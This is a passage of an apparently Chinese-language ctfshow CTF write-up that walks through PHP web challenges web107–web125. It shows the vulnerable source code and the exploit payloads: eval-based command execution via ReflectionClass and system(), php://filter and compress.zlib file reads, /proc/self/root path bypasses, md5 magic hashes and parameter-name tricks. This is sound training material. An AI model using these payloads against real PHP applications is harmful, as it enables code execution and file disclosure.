class="line-numbers language-none"><code class="language-none">GET: v3&#x3D;240610708POST: v1&#x3D;flag&#x3D;0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>此时$v1的值为flag&#x3D;0，通过<code>parse_str($v1, $v2);</code> 将 <code>$v1</code> 解析成关联数组 <code>$v2</code>，这时 <code>$v2</code> 变成 <code>array(&#39;flag&#39; =&gt; &#39;0&#39;)</code>。</p><p>所以第二个语句就变成if(0&#x3D;&#x3D;md5($v3))即可echo出flag，那么结合我们前面所学，有以下这些值md5后为0，随机挑选一个即可。</p><blockquote><p>md5：                                                                                                       240610708:0e462097431906509019562988736854<br>QLTHNDT:0e405967825401955372549139051580<br>QNKCDZO:0e830400451993494058024219903391<br>PJNPDWY:0e291529052894702774557631701704<br>NWWKITQ:0e763082070976038347657360817689<br>NOOPCJF:0e818888003657176127862245791911<br>MMHUWUV:0e701732711630150438129209816536<br>MAUXXQC:0e478478466848439040434801845361</p></blockquote><h3 id="web108"><a href="#web108" class="headerlink" title="web108"></a>web108</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phphighlight_file(__FILE__);error_reporting(0);include(&quot;flag.php&quot;);if (ereg (&quot;^[a-zA-Z]+$&quot;, $_GET[&#39;c&#39;])&#x3D;&#x3D;&#x3D;FALSE) &#123;  die(&#39;error&#39;);&#125;&#x2F;&#x2F;只有36d的人才能看到flagif(intval(strrev($_GET[&#39;c&#39;]))&#x3D;&#x3D;0x36d)&#123;  echo $flag;&#125;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ereg函数可看该大佬<a href="https://blog.csdn.net/qq_25987491/article/details/79952393">php中ereg函数的截断漏洞_ereg漏洞-CSDN博客</a></p><p>**ereg()**函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字母的字符是大小写敏感的。ereg()限制password的格式，只能是数字或者字母。但ereg()函数存在NULL截断漏洞，可以使用%00绕过验证。(并且即使涉及为科学计数法，e也必须是小写)</p><pre class="line-numbers language-none"><code class="language-none">strrev() 函数反转字符串。-------------------语法--------------------------strrev(string)参数描述string必需。规定要反转的字符串。intval() 函数用于获取变量的整数值。intval() 函数通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1。-------------------语法--------------------------int intval ( mixed $var [, int $base &#x3D; 10 ] )参数说明：$var：要转换成 integer 的数量值。$base：转化所使用的进制。如果 base 是 0，通过检测 var 的格式来决定使用的进制：如果字符串包括了 &quot;0x&quot; (或 &quot;0X&quot;) 的前缀，使用 16 进制 (hex)；否则，如果字符串以 &quot;0&quot; 开始，使用 8 进制(octal)；否则，将使用 10 进制 (decimal)。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由此我们可以0x36d转换为十进制，即为877，所以将其倒置，再通过abc加上%00截断绕过ereg函数</p><p>可构造得到flag</p><pre class="line-numbers language-none"><code class="language-none">GET: c&#x3D;abc%00778<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401191803960.png"></p><h3 id="web109"><a href="#web109" class="headerlink" title="web109"></a>web109</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phphighlight_file(__FILE__);error_reporting(0);if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]))&#123;  $v1 &#x3D; $_GET[&#39;v1&#39;];  $v2 &#x3D; $_GET[&#39;v2&#39;];  if(preg_match(&#39;&#x2F;[a-zA-Z]+&#x2F;&#39;, $v1) &amp;&amp; preg_match(&#39;&#x2F;[a-zA-Z]+&#x2F;&#39;, $v2))&#123;      eval(&quot;echo new $v1($v2());&quot;);  &#125;&#125;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>v1和v2都需要以大小写字母开头的字符，而在其if判断中的是一个eval执行一个字符串表达式。</p><p>我们在php101学习到了php自带的一些反射类(ReflectionClass)，(其实还有一个异常处理类 <strong>Exception</strong>，不过此时对于v1直接赋值即可，<strong>v1&#x3D;Exception();system(“ls”);&amp;v2&#x3D;a</strong>)所以我们可以先对$v1赋值一个反射类，即对应new创建，然后给v2赋值一些可执行命令，所以我们可以构造</p><pre class="line-numbers language-none"><code class="language-none">GET: v1&#x3D;ReflectionClass&amp;v2&#x3D;system(&#39;ls&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401211138857.png"></p><pre class="line-numbers language-none"><code class="language-none">GET: v1&#x3D;ReflectionClass&amp;v2&#x3D;system(&#39;cat f*&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>执行后打开源代码可以找到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401211139618.png"></p><h3 id="web110"><a href="#web110" class="headerlink" title="web110"></a>web110</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phphighlight_file(__FILE__);error_reporting(0);if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]))&#123;  $v1 &#x3D; $_GET[&#39;v1&#39;];  $v2 &#x3D; $_GET[&#39;v2&#39;];  if(preg_match(&#39;&#x2F;\~|\&#96;|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\&#x3D;|\&#123;|\[|\;|\:|\&quot;|\&#39;|\,|\.|\?|\\\\|\&#x2F;|[0-9]&#x2F;&#39;, $v1))&#123;      die(&quot;error v1&quot;);  &#125;  if(preg_match(&#39;&#x2F;\~|\&#96;|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\&#x3D;|\&#123;|\[|\;|\:|\&quot;|\&#39;|\,|\.|\?|\\\\|\&#x2F;|[0-9]&#x2F;&#39;, $v2))&#123;      die(&quot;error v2&quot;);  &#125;  eval(&quot;echo new $v1($v2());&quot;);&#125;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时v1和v2只能输入以下的字符，否则就会触发die函数</p><blockquote><p> &#x2F;&lt;&gt;?ABCDEFGHIJKLMNOPQRSTUVWXYZ]abcdefghijklmnopqrstuvwxyz|}</p></blockquote><p>可以看出，上题的构造已经没法用，其将单引号，双引号，反引号都给过滤掉了</p><p>看了大佬wp才了解这里考查的是php的另一个内置类  <strong>FilesystemIterator</strong>（文件系统迭代器在PHP5.3新加入，继承自DirectoryIterator，可以通过传入路径得到索引该目录下所有文件的迭代器）</p><p>然后通过<strong>getcwd()方法（成功时返回当前工作目录）</strong>用于返回当前路径，详情可看<a href="https://www.php.net/manual/en/class.filesystemiterator.php">PHP： FilesystemIterator - Manual</a>、<a href="https://www.php.net/manual/en/function.getcwd">PHP： getcwd - 手册</a></p><p>新建FilesystemIterator，可以显示当前目录下的文件结构。其将括号过滤，但是题目中已经给了一个括号了，所以不用在意。再通过getcwd获得该工作目录，正好就是flag存放的文件</p><pre class="line-numbers language-none"><code class="language-none">构造GET：v1&#x3D;FilesystemIterator&amp;v2&#x3D;getcwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401211203450.png"></p><p>访问即可拿到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401211203996.png"></p><h3 id="web111"><a href="#web111" class="headerlink" title="web111"></a>web111</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phphighlight_file(__FILE__);error_reporting(0);include(&quot;flag.php&quot;);function getFlag(&amp;$v1,&amp;$v2)&#123;  eval(&quot;$$v1 &#x3D; &amp;$$v2;&quot;);  var_dump($$v1);&#125;if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]))&#123;  $v1 &#x3D; $_GET[&#39;v1&#39;];  $v2 &#x3D; $_GET[&#39;v2&#39;];  if(preg_match(&#39;&#x2F;\~| |\&#96;|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\&#x3D;|\&#123;|\[|\;|\:|\&quot;|\&#39;|\,|\.|\?|\\\\|\&#x2F;|[0-9]|\&lt;|\&gt;&#x2F;&#39;, $v1))&#123;      die(&quot;error v1&quot;);  &#125;  if(preg_match(&#39;&#x2F;\~| |\&#96;|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\&#x3D;|\&#123;|\[|\;|\:|\&quot;|\&#39;|\,|\.|\?|\\\\|\&#x2F;|[0-9]|\&lt;|\&gt;&#x2F;&#39;, $v2))&#123;      die(&quot;error v2&quot;);  &#125;    if(preg_match(&#39;&#x2F;ctfshow&#x2F;&#39;, $v1))&#123;      getFlag($v1,$v2);  &#125;&#125;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>过滤后仅有输出这些字符不触发die函数ABCDEFGHIJKLMNOPQRSTUVWXYZ]abcdefghijklmnopqrstuvwxyz|}</p></blockquote><p>且v1还需要有<strong>ctfshow</strong>，不过本题没有再用到eval函数，而是用到了getFlag函数</p><pre class="line-numbers language-none"><code class="language-none">function getFlag(&amp;$v1,&amp;$v2)&#123;  eval(&quot;$$v1 &#x3D; &amp;$$v2;&quot;);  var_dump($$v1);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>一个&#x3D;说明是赋值，所以原先得到的是$ctfshow&#x3D;$GLOBALS,即$$v1&#x3D;$GLOBALS，所以最终var_dump输出的就是**var_dump($GLOBALS)**；以此获取全局变量得到flag。</p><pre class="line-numbers language-none"><code class="language-none">?v1&#x3D;ctfshow&amp;v2&#x3D;GLOBALS<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401211212422.png"></p><h3 id="web112"><a href="#web112" class="headerlink" title="web112"></a>web112</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phphighlight_file(__FILE__);error_reporting(0);function filter($file)&#123;  if(preg_match(&#39;&#x2F;\.\.\&#x2F;|http|https|data|input|rot13|base64|string&#x2F;i&#39;,$file))&#123;    die(&quot;hacker!&quot;);  &#125;else&#123;    return $file;  &#125;&#125;$file&#x3D;$_GET[&#39;file&#39;];if(! is_file($file))&#123;  highlight_file(filter($file));&#125;else&#123;  echo &quot;hacker!&quot;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>先看下面的判断，通过is_file函数判断file是否为常规文件，如果不是就触发filter函数，而在filter函数中对rot13、base64等进行过滤，如果含有就触发die函数，那么从filter过滤的字符来看，本题应该要用到伪协议来读取从而拿到flag文件，没给提示多半存在flag.php文件中</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">所以我们可以构造file&#x3D;php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;flag.php   &#x2F;&#x2F;直接读取其他file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.quoted-printable-encode&#x2F;resource&#x3D;flag.php file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.iconv.*&#x2F;resource&#x3D;flag.phpfile&#x3D;php:&#x2F;&#x2F;filter&#x2F;zlib.deflate|zlib.inflate&#x2F;resource&#x3D;flag.php  &#x2F;&#x2F;压缩与解压缩具体还有其他方式我没实验，可以看该大佬汇总https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_44657899&#x2F;article&#x2F;details&#x2F;109300335<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401211625178.png"></p><pre class="line-numbers language-none"><code class="language-none">参考is_file() 函数检查指定的文件是否是常规的文件。-----------------------语法---------------------------------------is_file(file)参数描述file必需。规定要检查的文件。quoted_printable_encode() 函数把 8 位字符串转换为 quoted-printable 字符串。-----------------------语法---------------------------------------quoted_printable_encode(string)参数描述string必需。规定要转换的 8 位字符串。convert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt; &lt;input-encoding&gt;和&lt;output-encoding&gt; 就是编码方式，有如下几种;UCS-4*UCS-4BEUCS-4LE*UCS-2UCS-2BEUCS-2LEUTF-32*UTF-32BE*UTF-32LE*UTF-16*UTF-16BE*UTF-16LE*UTF-7UTF7-IMAPUTF-8*ASCII*如果input和output都给参，那么意思就是从input形式转换为output形式。大佬链接：https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_44657899&#x2F;article&#x2F;details&#x2F;109300335<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="web113"><a href="#web113" class="headerlink" title="web113"></a>web113</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phphighlight_file(__FILE__);error_reporting(0);function filter($file)&#123;  if(preg_match(&#39;&#x2F;filter|\.\.\&#x2F;|http|https|data|data|rot13|base64|string&#x2F;i&#39;,$file))&#123;    die(&#39;hacker!&#39;);  &#125;else&#123;    return $file;  &#125;&#125;$file&#x3D;$_GET[&#39;file&#39;];if(! is_file($file))&#123;  highlight_file(filter($file));&#125;else&#123;  echo &quot;hacker!&quot;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>跟上题差不多，不过把input去掉了，但也把filter方式给过滤了，开始我想着通过php:&#x2F;&#x2F;input的方式输出php代码获取，但是结果确实将代码直接输出在源码下方</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401211648515.png"></p><p>看佬wp得知，有两种方式来解决</p><p>第一种可以通过读取压缩流从而获得flag</p><pre class="line-numbers language-none"><code class="language-none">file&#x3D;compress.zlib:&#x2F;&#x2F;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401211649243.png"></p><p>第二种则是利用到linux里<code>/proc/self/root</code>是指向根目录的，如果对其ls，则代表访问根目录。因此多次重复 <code>/proc/self/root</code>，导致路径深入到 <code>/var/www/html/flag.php</code>，并从而绕过了常规文件检查。</p><pre class="line-numbers language-none"><code class="language-none">从而构造造file&#x3D;&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401211651862.png"></p><h3 id="web114"><a href="#web114" class="headerlink" title="web114"></a>web114</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);highlight_file(__FILE__);function filter($file)&#123;  if(preg_match(&#39;&#x2F;compress|root|zip|convert|\.\.\&#x2F;|http|https|data|data|rot13|base64|string&#x2F;i&#39;,$file))&#123;    die(&#39;hacker!&#39;);  &#125;else&#123;    return $file;  &#125;&#125;$file&#x3D;$_GET[&#39;file&#39;];echo &quot;师傅们居然tql都是非预期 哼！&quot;;if(! is_file($file))&#123;  highlight_file(filter($file));&#125;else&#123;  echo &quot;hacker!&quot;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>原滋原味，不过过滤了更多字符，通过对compress、zip、root的过滤，我们php113的方法已经全部失效了，covert方法使得filter大部分方法也无法奏效，</p><p>不过我们可以像php112一样，直接filter读取该文件，从而得到flag</p><pre class="line-numbers language-none"><code class="language-none">file&#x3D;php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;flag.php其他file&#x3D;php:&#x2F;&#x2F;filter&#x2F;zlib.deflate|zlib.inflate&#x2F;resource&#x3D;flag.php  &#x2F;&#x2F;压缩和解压缩<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401211753801.png"></p><h3 id="web115"><a href="#web115" class="headerlink" title="web115"></a>web115</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phpinclude(&#39;flag.php&#39;);highlight_file(__FILE__);error_reporting(0);function filter($num)&#123;  $num&#x3D;str_replace(&quot;0x&quot;,&quot;1&quot;,$num);  $num&#x3D;str_replace(&quot;0&quot;,&quot;1&quot;,$num);  $num&#x3D;str_replace(&quot;.&quot;,&quot;1&quot;,$num);  $num&#x3D;str_replace(&quot;e&quot;,&quot;1&quot;,$num);  $num&#x3D;str_replace(&quot;+&quot;,&quot;1&quot;,$num);  return $num;&#125;$num&#x3D;$_GET[&#39;num&#39;];if(is_numeric($num) and $num!&#x3D;&#x3D;&#39;36&#39; and trim($num)!&#x3D;&#x3D;&#39;36&#39; and filter($num)&#x3D;&#x3D;&#39;36&#39;)&#123;  if($num&#x3D;&#x3D;&#39;36&#39;)&#123;    echo $flag;  &#125;else&#123;    echo &quot;hacker!!&quot;;  &#125;&#125;else&#123;  echo &quot;hacker!!!&quot;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过上面源码可以看到，其将num进行了多次检查，先检查该<code>$num</code>是否为一个数字，然后检查 <code>$num</code> 是否不等于字符串 “36”。随后通过trim函数检查去除首尾空格后的 <code>$num</code> 是否不等于字符串 “36”。最后调用 <code>filter()</code> 函数对 <code>$num</code> 进行一系列替换后，检查是否等于字符串 “36”。                                                                                                     而在filter函数中，将字符串中的 “0x” 、”0”、 “.”、”e”、”+” 替换为 “1”。</p><pre class="line-numbers language-none"><code class="language-none">trim() 函数移除字符串两侧的空白字符或其他预定义字符。--------------------------语法----------------------------------trim(string,charlist)参数描述string必需。规定要检查的字符串。charlist可选。规定从字符串中删除哪些字符。如果省略该参数，则移除下列所有字符：&quot;\0&quot; - NULL&quot;\t&quot; - 制表符&quot;\n&quot; - 换行&quot;\x0B&quot; - 垂直制表符&quot;\r&quot; - 回车&quot; &quot; - 空格<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>网上佬的过滤脚本</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpfor ($i &#x3D; 0; $i &lt; 129; $i++) &#123;    $char &#x3D; chr($i);    $num &#x3D; $char . &#39;36&#39;;    &#x2F;&#x2F; Check conditions    if(trim($num) !&#x3D;&#x3D; &#39;36&#39; &amp;&amp; is_numeric($num) &amp;&amp; $num !&#x3D;&#x3D; &#39;36&#39;)&#123;        echo urlencode($char) . &quot; &quot;;    &#125;&#125;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401211819162.png"></p><pre class="line-numbers language-none"><code class="language-none">构造GET： num&#x3D;%0C36    &#x2F;&#x2F;%0c &#x3D; &#x2F;f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401211820697.png"></p><h3 id="web123"><a href="#web123" class="headerlink" title="web123"></a>web123</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);highlight_file(__FILE__);include(&quot;flag.php&quot;);$a&#x3D;$_SERVER[&#39;argv&#39;];$c&#x3D;$_POST[&#39;fun&#39;];if(isset($_POST[&#39;CTF_SHOW&#39;])&amp;&amp;isset($_POST[&#39;CTF_SHOW.COM&#39;])&amp;&amp;!isset($_GET[&#39;fl0g&#39;]))&#123;  if(!preg_match(&quot;&#x2F;\\\\|\&#x2F;|\~|\&#96;|\!|\@|\#|\%|\^|\*|\-|\+|\&#x3D;|\&#123;|\&#125;|\&quot;|\&#39;|\,|\.|\;|\?&#x2F;&quot;, $c)&amp;&amp;$c&lt;&#x3D;18)&#123;     eval(&quot;$c&quot;.&quot;;&quot;);      if($fl0g&#x3D;&#x3D;&#x3D;&quot;flag_give_me&quot;)&#123;       echo $flag;     &#125;  &#125;&#125;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看看这个过滤，也就是说如果$c含有以下字符和c&lt;&#x3D;18触发这个eval函数，</p><blockquote><p>$&amp;():&lt;&gt;ABCDEFGHIJKLMNOPQRSTUVWXYZ[]_abcdefghijklmnopqrstuvwxyz|</p></blockquote><p>在POST传参中，如果参数名中含有<code>空格</code>和<code>点</code>，传入的参数名中点<code>.</code>和<code>空格</code>都被替换为了下划线<code>_</code>，这样的参数名确实无法传参，所以我们需要利用到<code>[</code>这个特性。                                                                                                          当<code>PHP版本小于8</code>时，如果参数中出现中括号<code>[</code>，中括号会被转换成下划线<code>_</code>，但是会出现转换错误导致接下来如果该参数名中还有<code>非法字符</code>并不会继续转换成下划线<code>_</code>，也就是说如果中括号<code>[</code>出现在前面，那么中括号<code>[</code>还是会被转换成下划线<code>_</code>，但是因为出错导致接下来的非法字符并不会被转换成下划线<code>_</code></p><p>可以参考该大佬博客<a href="https://blog.csdn.net/mochu7777777/article/details/115050295">谈一谈PHP中关于非法参数名传参问题_arr4y非法传参-CSDN博客</a></p><blockquote><p>PHP 超级全局变量列表:</p><ul><li>$GLOBALS</li><li>$_SERVER</li><li>$_REQUEST</li><li>$_POST</li><li>$_GET</li><li>$_FILES</li><li>$_ENV</li><li>$_COOKIE</li><li>$_SESSION</li></ul></blockquote><h4 id="第一种-1"><a href="#第一种-1" class="headerlink" title="第一种"></a>第一种</h4><p>所以我们可以构造</p><pre class="line-numbers language-none"><code class="language-none">POST: CTF_SHOW&#x3D;1&amp;CTF[SHOW.COM&#x3D;2&amp;fun&#x3D;echo $flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401212032664.png"></p><h4 id="第二种-1"><a href="#第二种-1" class="headerlink" title="第二种"></a>第二种</h4><p><a href="https://www.php.net/manual/zh/reserved.variables.argv.php">PHP: $argv - Manual</a></p><p>利用到argv的性质，从而我们可以构造</p><pre class="line-numbers language-none"><code class="language-none">GET: $fl0g&#x3D;flag_give_mePOST: CTF_SHOW&#x3D;1&amp;CTF[SHOW.COM&#x3D;2&amp;fun&#x3D;eval($a[0])<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401212046405.png"></p><h3 id="web125"><a href="#web125" class="headerlink" title="web125"></a>web125</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);highlight_file(__FILE__);include(&quot;flag.php&quot;);$a&#x3D;$_SERVER[&#39;argv&#39;];$c&#x3D;$_POST[&#39;fun&#39;];if(isset($_POST[&#39;CTF_SHOW&#39;])&amp;&amp;isset($_POST[&#39;CTF_SHOW.COM&#39;])&amp;&amp;!isset($_GET[&#39;fl0g&#39;]))&#123;  if(!preg_match(&quot;&#x2F;\\\\|\&#x2F;|\~|\&#96;|\!|\@|\#|\%|\^|\*|\-|\+|\&#x3D;|\&#123;|\&#125;|\&quot;|\&#39;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print&#x2F;i&quot;, $c)&amp;&amp;$c&lt;&#x3D;16)&#123;     eval(&quot;$c&quot;.&quot;;&quot;);     if($fl0g&#x3D;&#x3D;&#x3D;&quot;flag_give_me&quot;)&#123;       echo $flag;     &#125;  &#125;&#125;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>与上题相似，不过其将echo等输出语句也给过滤掉了，其特殊符号也与上题大差不差</p><blockquote><p>$&amp;():&lt;&gt;ABCDEFGHIJKLMNOPQRSTUVWXYZ[]_abcdefghijklmnopqrstuvwxyz|</p></blockquote><p>不过还有一个parse_str函数可以使用</p><pre class="line-numbers language-none"><code class="language-none">parse_str() 函数把查询字符串解析到变量中。注释：如果未设置 array 参数，由该函数设置的变量将覆盖已存在的同名变量。注释：php.ini 文件中的 magic_quotes_gpc 设置影响该函数的输出。如果已启用，那么在 parse_str() 解析之前，变量会被 addslashes() 转换。-------------------------语法---------------------------------------parse_str(string,array)参数描述string必需。规定要解析的字符串。array可选。规定存储变量的数组名称。该参数指示变量存储到数组中。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>再结合上题我们也是涉及到了数组，我们可以这样构造</p><pre class="line-numbers language-none"><code class="language-none">GET: a&#x3D;1+fl0g&#x3D;flag_give_mePOST: CTF_SHOW&#x3D;1&amp;CTF[SHOW.COM&#x3D;1&amp;fun&#x3D;parse_str($a[1]) <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401221053570.png"></p><p>在我看来 GET 请求的参数部分包含 <code>1+fl0g=flag_give_me</code>，而这样的构造会使整个 PHP 文件无法正常解析。实际上，<code>a=1+fl0g=flag_give_me</code> 应该是两个独立的 GET 参数，而不是一个。所以修改 GET 请求的构造，使其变为：<code>a=1&amp;fl0g=flag_give_me</code>。这样在parse_str函数中就会使得<code>fl0g</code>的值为<code>flag_give_me</code>                             代码为</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php$inputString &#x3D; &quot;1&amp;fl0g&#x3D;flag_give_me&quot;;$variables &#x3D; array();parse_str($inputString, $variables);var_dump($variables);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401221229139.png"></p><p><strong>还有一种是看大佬wp的方式</strong></p><p><strong>1、cli模式（命令行）下</strong></p><pre><code>第一个参数$_SERVER[&#39;argv&#39;][0]是脚本名，其余的是传递给脚本的参数</code></pre><p><strong>2、web网页模式下</strong></p><pre><code>在web页模式下必须在php.ini开启register_argc_argv配置项设置register_argc_argv = On(默认是Off)，重启服务，$_SERVER[‘argv’]才会有效果这时候的$_SERVER[‘argv’][0] = $_SERVER[‘QUERY_STRING’]$argv,$argc在web模式下不适用</code></pre><p>而$_SERVER[‘QUERY_STRING’]会获取查询语句即GET传参?的语句，所以</p><pre class="line-numbers language-none"><code class="language-none">?$fl0g&#x3D;flag_give_me    $a[0]&#x3D;$_SERVER[‘argv’][0]&#x3D;$_SERVER[‘QUERY_STRING’]&#x3D;&gt;$fl0g&#x3D;flag_give_me <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>所以我们可以构造</p><pre class="line-numbers language-none"><code class="language-none">GET: $fl0g&#x3D;flag_give_me;POST: CTF_SHOW&#x3D;1&amp;CTF[SHOW.COM&#x3D;2&amp;fun&#x3D;eval($a[0])<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401221239246.png"></p><p><strong>官方WP</strong></p><pre class="line-numbers language-none"><code 